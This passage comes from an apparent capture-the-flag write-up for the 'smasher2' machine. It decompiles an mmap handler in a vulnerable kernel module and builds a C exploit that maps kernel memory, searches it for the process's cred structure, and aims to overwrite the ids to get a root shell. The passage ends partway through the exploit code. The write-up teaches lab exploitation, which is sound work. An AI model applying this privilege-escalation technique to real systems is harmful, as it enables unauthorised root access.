  <span class="n">uint</span> <span class="n">uVar3</span><span class="p">;</span>
  
  <span class="n">__fentry__</span><span class="p">();</span>
  <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">param_2</span><span class="p">;</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">param_2</span><span class="p">[</span><span class="mh">0x13</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mh">0xc</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100380</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar3</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mh">0x13</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mh">0xc</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((((</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar3</span> <span class="o">&lt;</span> <span class="mh">0x10001</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">uVar1</span> <span class="o">&lt;</span> <span class="mh">0x1001</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">int</span><span class="p">)(</span><span class="n">uVar3</span> <span class="o">+</span> <span class="n">uVar1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x10001</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uVar1</span> <span class="o">=</span> <span class="n">remap_pfn_range</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="o">*</span><span class="n">param_2</span><span class="p">,(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="o">*</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mi">9</span><span class="p">]);</span>
    <span class="n">uVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">uVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010057b</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">uVar2</span> <span class="o">=</span> <span class="mh">0xfffffff5</span><span class="p">;</span>
      <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100567</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">uVar2</span> <span class="o">=</span> <span class="mh">0xfffffff5</span><span class="p">;</span>
    <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001003b0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br>In case you don’t know what <code class="highlighter-rouge">mmap</code> is, simply <code class="highlighter-rouge">mmap</code> is a system call which is used to map memory to a file or a device. (Check <a href="https://jameshfisher.com/2017/01/26/mmap/" target="_blank" rel="noopener noreferrer">this</a>)
<br>The function <code class="highlighter-rouge">dev_mmap()</code> is a custom <code class="highlighter-rouge">mmap</code> handler.
<br>The interesting part here is the call to <code class="highlighter-rouge">remap_pfn_range()</code> function (remap kernel memory to userspace):</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">remap_pfn_range</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="o">*</span><span class="n">param_2</span><span class="p">,(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="o">*</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mi">9</span><span class="p">]);</span>
</code></pre></div></div>
<p><br>I checked the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-remap-pfn-range.html" target="_blank" rel="noopener noreferrer">documentation</a> of <code class="highlighter-rouge">remap_pfn_range()</code> to know more about it, the function takes 5 arguments:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">remap_pfn_range</span> <span class="p">(</span>	<span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span> <span class="n">vma</span><span class="p">,</span>
 	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span>
 	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pfn</span><span class="p">,</span>
 	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">,</span>
 	<span class="n">pgprot_t</span> <span class="n">prot</span><span class="p">);</span>
</code></pre></div></div>
<p><br>Description of each argument:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span> <span class="n">vma</span>
    <span class="n">user</span> <span class="n">vma</span> <span class="n">to</span> <span class="n">map</span> <span class="n">to</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span>
    <span class="n">target</span> <span class="n">user</span> <span class="n">address</span> <span class="n">to</span> <span class="n">start</span> <span class="n">at</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pfn</span>
    <span class="n">physical</span> <span class="n">address</span> <span class="n">of</span> <span class="n">kernel</span> <span class="n">memory</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span>
    <span class="n">size</span> <span class="n">of</span> <span class="n">map</span> <span class="n">area</span>

<span class="n">pgprot_t</span> <span class="n">prot</span>
    <span class="n">page</span> <span class="n">protection</span> <span class="n">flags</span> <span class="k">for</span> <span class="n">this</span> <span class="n">mapping</span>
</code></pre></div></div>
<p><br>If we look at the function call again we can see that the 3rd and 4th arguments (physical address of the kernel memory and size of map area) are given to the function without any prior validation:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ulong</span> <span class="nf">dev_mmap</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">long</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="n">ulong</span> <span class="n">uVar2</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">uVar3</span><span class="p">;</span>
  
  <span class="n">__fentry__</span><span class="p">();</span>
  <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">param_2</span><span class="p">;</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">param_2</span><span class="p">[</span><span class="mh">0x13</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mh">0xc</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100380</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar3</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mh">0x13</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mh">0xc</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((((</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar3</span> <span class="o">&lt;</span> <span class="mh">0x10001</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">uVar1</span> <span class="o">&lt;</span> <span class="mh">0x1001</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">int</span><span class="p">)(</span><span class="n">uVar3</span> <span class="o">+</span> <span class="n">uVar1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x10001</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uVar1</span> <span class="o">=</span> <span class="n">remap_pfn_range</span><span class="p">(</span><span class="n">param_2</span><span class="p">,</span><span class="o">*</span><span class="n">param_2</span><span class="p">,(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar1</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="o">*</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_2</span><span class="p">[</span><span class="mi">9</span><span class="p">]);</span>
    <span class="p">...</span>
</code></pre></div></div>
<p><br>This means that we can map any size of memory we want and read/write to it, allowing us to even access the kernel memory.
<br></p>
<hr>

<h2 id="dhidko-exploitation--root-shell--root-flag">dhid.ko: Exploitation –&gt; Root Shell –&gt; Root Flag</h2>
<p><br>Luckily, <a href="https://labs.f-secure.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf" target="_blank" rel="noopener noreferrer">this white paper</a> had a similar scenario and explained the exploitation process very well, I recommend reading it after finishing the write-up, I will try to explain the process as good as I can but the paper will be more detailed. In summary, what’s going to happen is that we’ll map a huge amount of memory and search through it for our process’s <code class="highlighter-rouge">cred</code> structure (The <code class="highlighter-rouge">cred</code> structure holds our process credentials) then overwrite our <code class="highlighter-rouge">uid</code> and <code class="highlighter-rouge">gid</code> with <code class="highlighter-rouge">0</code> and execute <code class="highlighter-rouge">/bin/sh</code>. Let’s go through it step by step.
<br>First, we need to make sure that it’s really exploitable, we’ll try to map a huge amount of memory and check if it worked:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;                                                        
#include &lt;sys/types.h&gt;                                                       
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="o">*</span> <span class="n">argv</span><span class="p">){</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/dhid"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Open failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Open OK fd: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmapStart</span> <span class="o">=</span> <span class="mh">0x42424000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mmapStart</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"[!] Failed to mmap"</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] mmap OK address: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
	
	<span class="kt">int</span> <span class="n">stop</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br>I compiled the code and uploaded it to the box:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/smasher2# gcc -o pwn pwn.c 
root@kali:~/Desktop/HTB/boxes/smasher2# scp -i id_rsa ./pwn dzonerzy@smasher2.htb:/dev/shm/pwn
pwn                                                                                100%   17KB  28.5KB/s   00:00    
root@kali:~/Desktop/HTB/boxes/smasher2# 
</code></pre></div></div>
<p><br>Then I ran it:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ ./pwn 
[+] PID: 8186
[*] Open OK fd: 3
[*] mmap OK address: 42424000

</code></pre></div></div>
<p><br>From another <code class="highlighter-rouge">ssh</code> session I checked the process memory mapping, the attempt was successful:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ cat /proc/8186/maps 
42424000-132424000 rw-s 00000000 00:06 440                               /dev/dhid
----------
 Redacted
----------
dzonerzy@smasher2:/dev/shm$
</code></pre></div></div>
<p><br>Now we can start searching for the <code class="highlighter-rouge">cred</code> structure that belongs to our process, if we take a look at the how the <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">cred</code> structure</a> looks like:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
	<span class="n">atomic_t</span>	<span class="n">usage</span><span class="p">;</span>
<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
</span>	<span class="n">atomic_t</span>	<span class="n">subscribers</span><span class="p">;</span>	<span class="cm">/* number of processes subscribed */</span>
	<span class="kt">void</span>		<span class="o">*</span><span class="n">put_addr</span><span class="p">;</span>
	<span class="kt">unsigned</span>	<span class="n">magic</span><span class="p">;</span>
<span class="cp">#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
</span>	<span class="n">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
	<span class="n">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
	<span class="kt">unsigned</span>	<span class="n">securebits</span><span class="p">;</span>	<span class="cm">/* SUID-less security management */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_permitted</span><span class="p">;</span>	<span class="cm">/* caps we're permitted */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_effective</span><span class="p">;</span>	<span class="cm">/* caps we can actually use */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_bset</span><span class="p">;</span>	<span class="cm">/* capability bounding set */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_ambient</span><span class="p">;</span>	<span class="cm">/* Ambient capability set */</span>
<span class="cp">#ifdef CONFIG_KEYS
</span>	<span class="kt">unsigned</span> <span class="kt">char</span>	<span class="n">jit_keyring</span><span class="p">;</span>	<span class="cm">/* default keyring to attach requested
					 * keys to */</span>
	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">session_keyring</span><span class="p">;</span> <span class="cm">/* keyring inherited over fork */</span>
	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">process_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this process */</span>
	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">thread_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this thread */</span>
	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">request_key_auth</span><span class="p">;</span> <span class="cm">/* assumed request_key authority */</span>
<span class="cp">#endif
#ifdef CONFIG_SECURITY
</span>	<span class="kt">void</span>		<span class="o">*</span><span class="n">security</span><span class="p">;</span>	<span class="cm">/* subjective LSM security */</span>
<span class="cp">#endif
</span>	<span class="k">struct</span> <span class="n">user_struct</span> <span class="o">*</span><span class="n">user</span><span class="p">;</span>	<span class="cm">/* real user ID subscription */</span>
	<span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span> <span class="cm">/* user_ns the caps and keyrings are relative to. */</span>
	<span class="k">struct</span> <span class="n">group_info</span> <span class="o">*</span><span class="n">group_info</span><span class="p">;</span>	<span class="cm">/* supplementary groups for euid/fsgid */</span>
	<span class="cm">/* RCU deletion */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">non_rcu</span><span class="p">;</span>			<span class="cm">/* Can we skip RCU deletion? */</span>
		<span class="k">struct</span> <span class="n">rcu_head</span>	<span class="n">rcu</span><span class="p">;</span>		<span class="cm">/* RCU deletion hook */</span>
	<span class="p">};</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br>We’ll notice that the first 8 integers (representing our <code class="highlighter-rouge">uid</code>, <code class="highlighter-rouge">gid</code>, saved <code class="highlighter-rouge">uid</code>, saved <code class="highlighter-rouge">gid</code>, effective <code class="highlighter-rouge">uid</code>, effective <code class="highlighter-rouge">gid</code>, <code class="highlighter-rouge">uid</code> and <code class="highlighter-rouge">gid</code> for the virtual file system) are known to us, which represents a reliable pattern to search for in the memory:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
	<span class="n">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
</code></pre></div></div>
<p><br>These 8 integers are followed by a variable called <code class="highlighter-rouge">securebits</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">unsigned</span>    <span class="n">securebits</span><span class="p">;</span> <span class="cm">/* SUID-less security management */</span>
</code></pre></div></div>
<p><br>Then that variable is followed by our capabilities:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">kernel_cap_t</span>    <span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_permitted</span><span class="p">;</span>  <span class="cm">/* caps we're permitted */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_effective</span><span class="p">;</span>  <span class="cm">/* caps we can actually use */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_bset</span><span class="p">;</span>   <span class="cm">/* capability bounding set */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_ambient</span><span class="p">;</span>    <span class="cm">/* Ambient capability set */</span>
</code></pre></div></div>
<p><br>Since we know the first 8 integers we can search through the memory for that pattern, when we find a valid <code class="highlighter-rouge">cred</code> structure pattern we’ll overwrite each integer of the 8 with a <code class="highlighter-rouge">0</code> and check if our <code class="highlighter-rouge">uid</code> changed to <code class="highlighter-rouge">0</code>, we’ll keep doing it until we overwrite the one which belongs to our process, then we’ll overwrite the capabilities with <code class="highlighter-rouge">0xffffffffffffffff</code> and execute <code class="highlighter-rouge">/bin/sh</code>. Let’s try to implement the search for <code class="highlighter-rouge">cred</code> structures first. 
<br>To do that we will get our <code class="highlighter-rouge">uid</code> with <code class="highlighter-rouge">getuid()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
</code></pre></div></div>
<p><br>Then search for 8 consecutive integers that are equal to our <code class="highlighter-rouge">uid</code>, when we find a <code class="highlighter-rouge">cred</code> structure we’ll print its pointer and keep searching:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">while</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">mmapStart</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">)){</span>
		<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">if</span><span class="p">(</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span>
			<span class="p">){</span>
				<span class="n">credNum</span><span class="o">++</span><span class="p">;</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Cred structure found! ptr: %p, crednum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
			<span class="p">}</span>

		<span class="n">addr</span><span class="o">++</span><span class="p">;</span>

	<span class="p">}</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">pwn.c</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;                                                                          
#include &lt;stdlib.h&gt;                                                        
#include &lt;sys/types.h&gt;                                                       
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="o">*</span> <span class="n">argv</span><span class="p">){</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
	
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/dhid"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Open failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Open OK fd: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
	
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmapStart</span> <span class="o">=</span> <span class="mh">0x42424000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mmapStart</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"[!] Failed to mmap"</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] mmap OK address: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Current UID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credNum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">mmapStart</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">)){</span>
		<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">if</span><span class="p">(</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
